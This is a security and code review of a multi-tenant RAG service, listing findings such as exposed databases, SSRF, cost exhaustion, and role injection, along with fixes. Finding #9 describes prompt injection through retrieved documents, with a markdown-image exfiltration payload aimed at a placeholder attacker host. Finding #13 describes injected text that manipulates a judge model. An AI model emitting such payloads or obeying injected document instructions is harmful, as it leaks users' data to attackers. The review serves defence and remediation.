# GenRAG — Code & Security Review: Recommendations

_Review date: 2026-10-11 — branch `Code_Review`_

> Status: complete. All findings were verified against the code; worker-side findings were reproduced
> locally against the worker's dependency versions (lxml 6.1.3, trafilatura 2.3.1, markitdown 0.1.5).

---

## 🔴 Critical — do now

### 1. Rotate the leaked ZeroEntropy API key
- Committed in `test.py` (commit `27c13cc`, 2026-06-21), removed in `3c442d3`, still in git history on `origin` branches.
- **Action:** revoke it in the ZeroEntropy dashboard and issue a new one. Rewriting history (`git filter-repo`) is optional — rotation is what matters.

### 2. Stop exposing Redis, Qdrant and MinIO publicly
- `docker-compose.yml` publishes `6379` (Redis, no auth), `6333` (Qdrant, no API key), `9010/9011` (MinIO) on all interfaces. Docker port publishing bypasses `ufw`.
- Impact if production uses this file: anyone can read every tenant's documents from Qdrant, or push jobs into Redis. The worker trusts Redis job payloads, so an injected job can **copy any tenant's file into the attacker's org** (`s3_path` of the victim, `org_id` of the attacker), or wipe and poison a victim's index (`org_id` of the victim).
- **Action:**
  - Remove the `ports:` entries (or bind to `127.0.0.1:...`).
  - Set `QDRANT__SERVICE__API_KEY`, Redis `requirepass`, and strong MinIO credentials (not `minioadmin` / `password`).
  - Verify from outside: `curl -m 5 http://146.59.190.130:6333/collections` — any response means it's exposed.

### 3. Omitting `org_id` disables all cost tracking → free LLM proxy
- `RagRequest.org_id` is optional (`app/schemas/rag.py:165`), and every block records cost only `if cost_tracker and org_id` (`answer_block.py:113`, `hyde_block.py:45`, `query_rewriter_block.py:139`, `refusal_block.py:119`, `verified_answer_block.py:85,155`, `rerank_block.py:70`).
- A pipeline without a `retrieve` block and without `org_id` (e.g. `query → answer` with an expensive model) runs fully and emits **no cost records and no `cost_summary`** — the backend can't bill it.
- **Action:** make `org_id: str = Field(min_length=1)` required in `RagRequest`, and record costs regardless of `org_id`.

### 4. Denial-of-wallet: nothing is bounded, cost is reported but never enforced
Unbounded today (all pass validation — tested with 55 blocks, `num_queries=10^6`, `max_tokens=-5`, a 5 MB query, 10k history messages):
- Number of blocks in a pipeline.
- `query_rewrite.num_queries`, `hyde.num_queries` — and the rewriter keeps **every** line the LLM returns (no truncation to `num_queries`).
- `hyde` in `compose` mode multiplies: chained hyde blocks give `L × N^k` sequential LLM calls (e.g. rewrite 100 → hyde 100 → hyde 100 ≈ 10⁶ calls).
- `max_tokens` on every LLM block; `query`, `system_prompt`, `chat_history` count and length.
- Model choice: any OpenRouter model (only `:batch` is rejected).
- `cost_tracker` only records — no budget, no pre-check, no abort, no per-org rate limit, no request timeout.
- One huge multi-query request also starves other tenants through the global embedding semaphore (`retrieve_block.py`, `Semaphore(10)`).

**Action:**
- `Field(ge=1, le=5)` on `num_queries`; truncate parsed queries to `num_queries`.
- `blocks: List[BlockConfig] = Field(max_length=10)`; at most one `hyde` block.
- `max_tokens: Field(ge=1, le=4096)`; `max_length` on `query`, `content`, `system_prompt`, and `chat_history`.
- Server-side model allowlist (or price ceiling).
- Per-request USD budget checked in the tracker (raise when exceeded) + backend checks prepaid credit before calling.

### 5. SSRF in website ingestion
- **Sitemap fetch (`requests.get` in `worker/loader.py`) has no guard:** it reaches any internal host (`http://qdrant:6333/...?.xml`, `http://minio:9000`), follows redirects, and any `<loc>` ending in `.xml` triggers it. The body isn't returned, but error messages land in the job status (readable without auth via `/job/{id}/status`), giving an internal port-scan oracle.
- **Page fetch (trafilatura):** version 2.3.1 has built-in SSRF protection (non-global IPs rejected on every redirect hop) — but the worker doesn't pin it (2.0.0 has no guard and fetched localhost in testing), the guard is disabled when `http_proxy` is set, and the server's own public IP counts as "global". When content does come back, HTML/XML bodies (e.g. MinIO XML error/listing pages) are extracted and indexed into the caller's knowledge base.
- `file://`, `ftp://`, `gopher://` are rejected by both libraries.
- **Action:** allow only `http`/`https`; resolve the hostname and reject non-global IPs and the host's own IP for **both** sitemap and page fetches (or route egress through a filtering proxy); `allow_redirects=False` or re-check each hop; pin `trafilatura>=2.3`; return generic job errors.

### 6. Don't run dev settings in production
- `rag_api` runs `uvicorn --reload` with the whole repo bind-mounted (`.:/app`).
- **Action:** use the Dockerfile `CMD` (multi-worker), no bind mount; pin image versions instead of `:latest`.

---

## 🟠 High

### 7. The `refusal` guardrail does nothing
- It sets `should_stop` / `final_answer` (`refusal_block.py:96-109`) but **nothing reads them** — the answer is generated anyway, contrary to `BLOCKS_FORMAT.md` ("peut arrêter le pipeline").
- It also reads `input_data["history"]` (`refusal_block.py:65`) instead of `chat_history`, so it never sees the conversation.
- **Action:** in `RagPipeline.execute`, when `should_stop` is set, stream `final_answer` and stop; read `chat_history`.

### 8. Chat history role injection (several blocks)
- `Message.role` accepts any string. `answer_block.py:97` and `verified_answer_block.py` forward roles verbatim → a client can inject `system` messages. `query_rewriter_block.py` formats any role as a "Role:" line, which can steer query expansion (feeds #4).
- **Action:** `role: Literal["user", "assistant"]` in `app/schemas/rag.py`.

### 9. Prompt injection from retrieved content, including markdown exfiltration
- Raw chunks and filenames go into the prompt, and the model is asked to answer in markdown. A crawled page or uploaded file can instruct the model to output `![x](https://evil/?d=<question + other sources>)` — if the frontend renders images, data leaks to the attacker. Injected content can also fake `[n]` citations.
- **Action:**
  - Frontend: don't render markdown images / external links from answers; CSP `img-src`.
  - Server: strip `![…](…)` and links to non-allowlisted domains from the token stream.
  - Wrap documents in clear delimiters with an instruction that their content is data, not instructions.

### 10. Cost reporting is unreliable
- `cost_summary` is sent only at the very end of the stream; answer usage is captured only after `[DONE]`. If the client disconnects, the summary is never sent and costs are lost (only stdout/Langfuse keep them).
- Rerank cost is a hard-coded estimate.
- **Action:** persist cost records server-side in a `finally` (e.g. Redis keyed by `pipeline_run_id`) and have the backend bill from that, not from the stream.

### 11. Shared API key + trusted `org_id`
- One key for everything; `org_id` comes from the caller → any key holder can read or delete any tenant's data.
- **Action:** per-tenant keys or a short-lived backend-signed token (HMAC/JWT) carrying the `org_id`. At minimum, separate keys for ingest/delete vs query.

### 12. Resource and cost exhaustion in ingestion
- `/ingest` does `await file.read()` with no size limit.
- **Decompression bomb, reproduced:** a 49 KB DOCX expanded to 9.8M characters → 10,000 chunks (~2.5M embedding tokens) in 16 s at ~500 MB RAM. Holding 10k × 4096-dim vectors as Python floats would need ~1.3 GB (computed) → OOM and a large OpenRouter bill from a tiny upload.
- Website crawl: `max_pages` is an unbounded int; unique child sitemaps recurse without limit; `requests.get` has no body-size cap and transparently gunzips (gzip bomb); `timeout=30` is per read, so a slow-drip server holds the job forever; everything runs in the single worker loop and blocks all tenants.
- **Action:** cap upload size (streamed read); cap extracted text length and `len(chunks)` per job and per org (credits); clamp `max_pages` (e.g. 1–500); limit sitemap count/depth; stream sitemaps with a byte cap (`stream=True`, abort above ~10 MB); total job time limit; several worker replicas.

### 12b. markitdown ignores the file-extension allowlist
- `worker/parse.py` passes `file_path=` to `md.convert(BytesIO(...))`, which ignores it — the converter is chosen by **content sniffing**. Reproduced with files named `x.pdf`: XLSX, PPTX, CSV, RSS, IPYNB and ZIP (recursive) all converted, and a **WAV file was routed to the audio converter, which sends the audio to Google's Web Speech API** (third-party data transfer).
- **Action:** `MarkItDown(enable_builtins=False)` and register only the PDF, DOCX, HTML and plain-text converters; pass `stream_info=StreamInfo(extension=ext)`; check magic bytes (`%PDF-`, `PK` + `word/document.xml`).

---

## 🟡 Medium

### 13. `verified_answer` judge fails open
- `if not decision.get("is_safe", True)` (`verified_answer_block.py:133`): a missing key lets the answer through, and the string `"false"` is truthy. An injected document can also tell the judge to output `{"is_safe": true}`.
- **Action:** require `decision.get("is_safe") is True`; validate the decision with a pydantic model.

### 14. Privacy (GDPR) — customer data sent to third parties and logs
- **Langfuse:** `@observe` on every block captures full inputs/outputs (queries, chat history, retrieved chunks, answers, cost records); `update_current_trace(metadata={"config": config})` copies the whole request; `update_current_generation(input=messages)` sends full prompts.
- **OpenRouter:** no `provider: {"data_collection": "deny"}` / ZDR in requests. Documents also go to ZeroEntropy / Cohere for reranking.
- **stdout:** `print(messages)` (`answer_block.py:105`) dumps system prompt, history and documents into Docker logs.
- **Action:** disable I/O capture (`LANGFUSE_OBSERVE_DECORATOR_IO_CAPTURE_ENABLED=false` or `capture_input/output=False`) or add a masking function; send only whitelisted metadata; add `"provider": {"data_collection": "deny"}`; remove the print; DPAs with all providers.

### 15. Worker defense-in-depth (critical if Redis is reachable — see #2)
- Reject jobs whose `s3_path` doesn't start with `{org_id}/{dataset_id}/` or contains `..` (`worker/main.py`).
- Validate `org_id` / `dataset_id` against a regex in the worker too; clamp `max_pages` from the payload.
- Optionally HMAC-sign job payloads in the API and verify them in the worker.
- Build point IDs from `json.dumps([org_id, dataset_id, filename, chunk_index])` instead of `f"{org}:{ds}:{file}:{i}"` — an `org_id` containing `:` could collide with another tenant's IDs (`worker/vector_db.py`).

### 16. Job endpoints
- `/job/{id}/status` and `/job/{id}/result` have no auth; Redis job keys never expire → add auth and a TTL (e.g. 7 days).

### 17. Rerank blocks the event loop
- Sync ZeroEntropy / Cohere clients inside `async def` (`rerank_block.py`) → one slow rerank stalls every request on that worker. **Action:** `asyncio.to_thread` or async clients.

---

## 🔵 Low

| # | Issue | Where | Fix |
|---|-------|-------|-----|
| 18 | OpenRouter key printed to logs: if `MINIO_USER`/`MINIO_PASSWORD`/`S3_ENDPOINT`/`BUCKET_NAME` is missing, the pydantic error printed includes `OPENROUTER_API_KEY` | `simple_openrouter_client.py:32` | Require only the key there; log `type(e)` |
| 19 | Error leakage: `[Pipeline Error: …]`, `[Generation Error: …]`, `/models*` `str(e)` reveal internals (Qdrant errors, missing-key messages) | `rag_pipeline.py`, `answer_block.py`, `main.py` | Generic message + `run_id`; details server-side |
| 20 | `get_model_endpoints` follows `links.details` from OpenRouter's response — an absolute URL would send the bearer token to another host (needs OpenRouter compromise) | `simple_openrouter_client.py` | Require path to start with `/api/v1/models/` |
| 21 | `collection_name` is caller-controlled (org filter still applies) | `schemas/rag.py` | Pin server-side |
| 22 | Untrusted numbers: `float(usage["cost"])` crashes on `None`, `inf`/`nan` corrupt totals; negative/NaN pricing skews model metrics | `cost_tracker.py`, `model_metrics.py` | `math.isfinite`, `max(0, …)` |
| 23 | Unauthenticated `/rag/stream/mock` accepts unbounded bodies | `main.py` | Body size limit (reverse proxy) |
| 23b | Sitemap XML parsing: XXE and billion-laughs were **not** exploitable on lxml 6.1.3 / libxml2 2.14.6 (tested), but the version isn't pinned; a `<url>` without `<loc>` crashes the job | `worker/loader.py` | `etree.XMLParser(resolve_entities=False, no_network=True, load_dtd=False)` or defusedxml; handle missing `loc` |
| 23c | No worker lockfile: `Dockerfile.worker` runs `uv sync` on version ranges, so deployed versions (and findings 5, 12b, 23b) depend on build date | `pyproject.worker.toml`, `Dockerfile.worker` | Commit a worker lockfile; `uv sync --frozen` |

---

## 🐞 Bugs & reliability

### High-impact bugs

- **`/retrieve` always returns 500** — calls `embedding_service.get_embedding()`, which doesn't exist in `app/services/embedding.py` (only `get_embedding_batch` / `process_chunks_concurrently`). Fix: add the method or reuse `RetrieveBlock._get_embedding`.
- **`verified_answer` refuses unless a working rerank runs before it** — it keeps only docs with `confidence_score >= 0.8` (`verified_answer_block.py:73-75`); only rerank sets that field, and rerank's fallback sets `0.5`. It also ignores `_sources`, so its citations never match `citation_check`. Fix: fall back to `score`, reuse `_sources` with `[n]` indexes.
- **HyDE `override` replaces the user's question used for the answer** — `hyde_block.py:125` sets `query` to the hypothetical document, so `answer`, `rerank` and `verified_answer` work on the fake document instead of the question. Fix: write HyDE output only to a retrieval key (`_queries`), never `query`.
- **Retrieval ignores `QDRANT_API_KEY`** — `retrieve_block.py:34` and `main.py:36` build `QdrantClient(url=...)` without the key (the services and worker pass it). With Qdrant auth enabled (see #2), retrieval breaks. Fix: pass `api_key`, or reuse the client from `app/services/vector_db.py`.

### Other bugs

| # | Issue | Where | Fix |
|---|-------|-------|-----|
| 24 | `/models/embeddings` always returns 500: calls `get_embedding_models`, method is `get_embeddings_models` | `main.py:423`, `simple_openrouter_client.py:88` | Rename one of them |
| 25 | `/models*` endpoints never close their `OpenRouterClient` → connection leak; `/info` makes 5 uncached upstream calls | `main.py` | `try/finally: await client.close()` or shared client; cache |
| 26 | Bucket default mismatch: API storage `genrag-documents` vs `app/config.py` and worker `genrag-docs` — if `BUCKET_NAME` is unset, uploads and downloads hit different buckets | `app/services/storage.py`, `app/config.py`, `worker/config.py` | One default, one settings object |
| 27 | Rerank block ignores user config (provider/model/top_k hard-coded) | `app/pipelines/rag_pipeline.py` | Use `block_config` (with allowlist) |
| 28 | Failed embeddings silently dropped; job still "completed" | `worker/main.py` | Report `chunks_failed`; fail above a threshold |
| 29 | Worker loses in-flight job on crash (`BLPOP`); one job at a time; 1 s sleep per crawled page blocks the queue | `worker/main.py`, `worker/loader.py` | `BLMOVE` + processing list; concurrency; separate crawl queue |
| 30 | Multi-query retrieval: merged results are neither re-sorted nor capped (up to N × `top_k` chunks reach the LLM); query parser keeps preamble lines and strips leading digits ("2024 budget" → "budget") | `retrieve_block.py`, `query_rewriter_block.py` | Sort by score + cap; parse with a numbered-list regex |
| 31 | Multi-query dedupe keys on `hash(text)` → identical boilerplate from different documents/datasets is merged | `retrieve_block.py:172` | Key on `(dataset_id, filename, chunk_index)` |
| 32 | Block order not validated: a non-streaming last block (or `answer` mid-pipeline) fails with `TypeError` only after all paid blocks ran | `rag_pipeline.py` | Validate order in `PipelineConfig` |
| 33 | Embedding errors during retrieval are silent (non-200 → `[]`) → user gets "Aucun document" with no error event | `retrieve_block.py` | Raise / emit an error event |
| 34 | Worker vector alignment: if an embedding response misses items, every following vector pairs with the wrong chunk | `worker/embedding.py` | Place vectors by `index` into a pre-sized list |
| 35 | Chunk size is in characters, not tokens (`token_counter=len`) — 1024 ≈ 250 tokens, no overlap; docstring says tokens | `worker/chunking.py` | Use a real tokenizer or fix the docs; consider overlap |
| 36 | `org_id` is unvalidated: `/` makes MinIO prefixes overlap (`acme` vs `acme/ds`), `:` can collide point IDs | `main.py` | Apply the dataset-id regex to `org_id` |
| 37 | `DELETE /documents` doesn't normalize the filename like ingest does; `DELETE` with a JSON body is fragile behind proxies | `main.py` | Same `basename` normalization; consider query params |
| 38 | `'captured_record' in dir()` checks are brittle | `answer_block.py`, `refusal_block.py` | Initialize `captured_record = None` up front |
| 39 | Docker: compose `--reload` overrides `WEB_CONCURRENCY`; anonymous `/app/.venv` volume keeps stale deps after rebuilds; worker has no healthcheck | `docker-compose.yml` | Separate dev/prod compose files |
| 40 | Docs drift: `BLOCKS_FORMAT.md` lists `google/gemini-2.5-flash` as default model; schema default is `qwen/qwen3.7-flash` | `BLOCKS_FORMAT.md` | Update docs |

### Dataset system — follow-ups

- **Website datasets can't be cleaned up properly:** pages removed from a sitemap are never deleted; `/ingest/website` returns the sitemap URL as `filename` but chunks are keyed by page URL, so `DELETE /documents` with it returns 404; deleting by page URL leaves the page JSON in MinIO. Fix: store a `source` (sitemap) payload and delete by source.
- **`DELETE /datasets` races with in-flight jobs:** a queued/running job re-creates chunks and page JSON after the delete. Fix: a Redis tombstone checked by the worker before upsert.

---

## 🧹 Maintainability & product

41. **Repo hygiene:** remove committed `app/ingestion/data.db` and `server.log`; extend `.gitignore` (`*.db`, `*.log`, `.env.*`); run containers as non-root.
42. **Deduplicate API/worker code** (storage, Qdrant, embedding) into a shared package — copies have already drifted.
43. **Delete dead code:** `app/ingestion/` (broken imports), unmounted `app/routers/costs.py`, stray `test.py`, `test2.py`, `badge_test.py`, `test.ipynb`.
44. **Add a pytest suite:** schema bounds, tenant/dataset filters (in-memory Qdrant), refusal stop, worker pipeline, auth.
45. **Skip re-embedding unchanged website pages** — the crawler already knows which pages changed.
46. **Per-dataset quota in `top_k`** so a large dataset can't crowd out a small one.
47. **Hybrid search** (sparse vectors / SPLADE) — already on the roadmap.

---

## ✅ Already done on this branch (uncommitted)

- Dataset system: `dataset_id` payload (indexed), `datasetIds` on the `retrieve` block, dataset-scoped MinIO keys, `DELETE /datasets/{dataset_id}`, migration script `scripts/migrate_to_datasets.py`.
- Fixed: documents > 100 chunks lost data (chunk IDs reset per upsert batch).
- Fixed: retrieval without `org_id` searched every tenant.
- Fixed: re-ingesting a shorter document left stale chunks. Stale points are now removed **after** the upsert (no window where the document disappears), including legacy untagged copies of the same file.
- Fixed: website crawl re-embedded every page ever crawled for the org.
- Fixed: empty `X-API-Key` accepted when `RAG_ENGINE_API_KEY` unset; key compared in constant time.
- Fixed: filename path components stripped on upload; vectors no longer printed in `/retrieve`; MinIO prefix delete paginated; `top_k` bounded 1–100.

- **One Qdrant collection per org** (`org_{org_id}`), name derived server-side; `collection_name` removed from requests; `DELETE /orgs/{org_id}`.
- `org_id` now required and validated on `/rag/stream` (closes the "no `org_id` → no cost tracking" gap of #3 for requests; the per-block `if org_id` checks can be removed later) and on all ingest/delete endpoints (#36).
- Worker rejects jobs with invalid IDs or an `s3_path` outside `{org_id}/{dataset_id}/` (#15, first two bullets).
- Retrieval now uses the Qdrant client that passes `QDRANT_API_KEY` (high-impact bug list).

**Deploy order for the dataset change:**
1. Drain the Redis queue.
2. Deploy.
3. For each org: `uv run python scripts/migrate_to_datasets.py --org-id ORG --dataset-id DATASET --dry-run`, then without `--dry-run`. It copies the org's points from the shared `genrag_knowledge_base` into `org_{org_id}` (tagging untagged ones with the dataset) and moves its MinIO files; checks MinIO before touching Qdrant. Once everything is verified, re-run with `--delete-source` (or drop the shared collection when all orgs are migrated).
4. **Re-ingest the documents the script lists with exactly 100 chunks** — the old batch-ID bug truncated every legacy document over 100 chunks to 100, and tagging can't recover the lost chunks.
5. Switch the backend to send `dataset_id` / `datasetIds`.
